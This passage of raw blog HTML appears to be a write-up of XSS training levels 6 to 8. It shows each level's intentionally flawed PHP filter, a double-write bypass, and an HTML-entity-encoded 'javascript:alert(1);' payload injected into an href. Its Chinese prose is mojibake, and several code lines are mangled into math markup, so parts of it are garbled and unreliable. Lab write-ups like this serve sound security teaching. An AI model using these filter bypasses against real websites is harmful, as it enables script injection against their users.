class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level6<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level6<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$str2</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;script\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"&lt;scr_ipt\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$str3</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"on\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"o_n\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$str4</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"src\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"sr_c\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$str5</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"da_ta\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token variable\">$str6</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"href\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"hr_ef\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2 align=center>æ²¡æœ‰æ‰¾åˆ°å’Œ\"</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"ç›¸å…³çš„ç»“æœ.&lt;/h2>\"</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;center></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>&lt;form action=level6.php method=GET></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&lt;input name=keyword  value=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$str6</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>&lt;input type=submit name=submit value=æœç´¢ /></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level6.png</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payloadçš„é•¿åº¦:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str6</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>2</mn><mo>=</mo><mi>s</mi><mi>t</mi><msub><mi>r</mi><mi>r</mi></msub><mi>e</mi><mi>p</mi><mi>l</mi><mi>a</mi><mi>c</mi><mi>e</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">&quot;</mi><mo>&lt;</mo><mi>s</mi><mi>c</mi><mi>r</mi><mi>i</mi><mi>p</mi><mi>t</mi><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">&quot;</mi><mo>&lt;</mo><mi>s</mi><mi>c</mi><msub><mi>r</mi><mi>i</mi></msub><mi>p</mi><mi>t</mi><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">r</span></span></span></span><span class=\"vlist-s\">â€‹</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">pl</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">ce</span><span class=\"mopen\">(</span><span class=\"mord\">&quot;</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">&lt;</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8889em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">scr</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">pt</span><span class=\"mord\">&quot;</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">&quot;</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">&lt;</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8889em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\">sc</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">â€‹</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">pt</span><span class=\"mord\">&quot;</span><span class=\"mpunct\">,</span></span></span></span>str);</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>3</mn><mo>=</mo><mi>s</mi><mi>t</mi><msub><mi>r</mi><mi>r</mi></msub><mi>e</mi><mi>p</mi><mi>l</mi><mi>a</mi><mi>c</mi><mi>e</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">&quot;</mi><mi>o</mi><mi>n</mi><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">&quot;</mi><msub><mi>o</mi><mi>n</mi></msub><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">3</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">r</span></span></span></span><span class=\"vlist-s\">â€‹</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">pl</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">ce</span><span class=\"mopen\">(</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">n</span><span class=\"mord\">&quot;</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">&quot;</span><span class=\"mord\"><span class=\"mord mathnormal\">o</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">â€‹</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">&quot;</span><span class=\"mpunct\">,</span></span></span></span>str2);</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>4</mn><mo>=</mo><mi>s</mi><mi>t</mi><msub><mi>r</mi><mi>r</mi></msub><mi>e</mi><mi>p</mi><mi>l</mi><mi>a</mi><mi>c</mi><mi>e</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">&quot;</mi><mi>s</mi><mi>r</mi><mi>c</mi><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">&quot;</mi><mi>s</mi><msub><mi>r</mi><mi>c</mi></msub><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">4</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">r</span></span></span></span><span class=\"vlist-s\">â€‹</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">pl</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">ce</span><span class=\"mopen\">(</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">src</span><span class=\"mord\">&quot;</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">s</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">c</span></span></span></span><span class=\"vlist-s\">â€‹</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">&quot;</span><span class=\"mpunct\">,</span></span></span></span>str3);</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>5</mn><mo>=</mo><mi>s</mi><mi>t</mi><msub><mi>r</mi><mi>r</mi></msub><mi>e</mi><mi>p</mi><mi>l</mi><mi>a</mi><mi>c</mi><mi>e</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">&quot;</mi><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">&quot;</mi><mi>d</mi><msub><mi>a</mi><mi>t</mi></msub><mi>a</mi><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">5</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">r</span></span></span></span><span class=\"vlist-s\">â€‹</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">pl</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">ce</span><span class=\"mopen\">(</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">a</span><span class=\"mord\">&quot;</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">d</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2806em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">â€‹</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">&quot;</span><span class=\"mpunct\">,</span></span></span></span>str4);</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>6</mn><mo>=</mo><mi>s</mi><mi>t</mi><msub><mi>r</mi><mi>r</mi></msub><mi>e</mi><mi>p</mi><mi>l</mi><mi>a</mi><mi>c</mi><mi>e</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">&quot;</mi><mi>h</mi><mi>r</mi><mi>e</mi><mi>f</mi><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">&quot;</mi><mi>h</mi><msub><mi>r</mi><mi>e</mi></msub><mi>f</mi><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">6</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">r</span></span></span></span><span class=\"vlist-s\">â€‹</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">pl</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">ce</span><span class=\"mopen\">(</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">re</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord\">&quot;</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">h</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">e</span></span></span></span><span class=\"vlist-s\">â€‹</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord\">&quot;</span><span class=\"mpunct\">,</span></span></span></span>str5);</p>\n<p>è¿‡æ»¤äº†æ›´å¤šæ ‡ç­¾</p>\n<h4 id=\"ç¬¬ä¸ƒå…³\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬ä¸ƒå…³\">#</a> <span class=\"label\">ç¬¬ä¸ƒå…³</span></h4>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/16.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/17.png\" alt=\"\"></p>\n<p>æŠŠ href è¿‡æ»¤ä¸ºç©ºäº†ï¼Œå¯ä»¥å†™ä¸¤éåŒå†™ç»•è¿‡</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/18.png\" alt=\"\"></p>\n<h4 id=\"ç¬¬å…«å…³\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬å…«å…³\">#</a> <span class=\"label\">ç¬¬å…«å…³</span></h4>\n<p>æŠŠè¾“å…¥å†…å®¹åˆ°äº† input æ ‡ç­¾é‡Œå’Œ a æ ‡ç­¾é‡Œ</p>\n<p>script è¢«æ›¿æ¢åŒå¼•å·è¢«è½¬ä¹‰</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/19.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/20.png\" alt=\"\"></p>\n<p>javascript ä¹Ÿè¢«æ›¿æ¢äº†</p>\n<p>æŠŠ javascript:alert (1); ç¼–ç </p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/21.png\" alt=\"\"></p>\n<p><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#59;</code>  ç»•è¿‡æ›¿æ¢æ£€æµ‹åˆ° herf é‡Œé¢ä¼šè¢«è§£ç </p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/22.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/24.png\" alt=\"\"></p>\n<p><span class=\"label\">ğŸ‘ä»£ç åˆ†æ</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"å®Œæˆçš„ä¸é”™ï¼\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level9.php?keyword=not bad!\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level8<span class=\"token tag\"><span class=\"token tag\"><span 